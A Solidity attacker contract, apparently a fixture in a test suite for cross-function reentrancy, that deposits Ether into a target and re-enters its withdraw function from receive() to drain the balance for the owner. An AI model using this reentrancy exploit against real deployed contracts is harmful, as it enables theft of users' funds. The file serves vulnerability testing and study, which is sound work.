// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../interfaces/cross-function/ICrossFunction.sol";

contract CrossMutexOrder_Attacker {
    ICrossFunction public c;
    address public owner;

    constructor(address _c) {
        c = ICrossFunction(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        c.deposit{value: 1 ether}();
        c.withdraw();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.withdraw();
        }
    }
}
